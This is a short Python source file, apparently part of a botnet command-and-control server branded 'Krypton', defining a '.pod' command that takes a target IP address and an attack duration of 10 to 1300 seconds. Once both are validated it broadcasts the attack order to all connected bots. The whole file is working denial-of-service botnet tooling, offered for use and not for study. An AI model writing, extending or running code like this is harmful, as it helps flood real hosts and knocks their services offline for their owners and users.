from colorama import Fore

def pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 3:
        ip = args[1]
        secs = args[2]
        if validate_ip(ip):
                if validate_time(secs):
                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, '\nUsage: .pod [IP] [TIME]\n')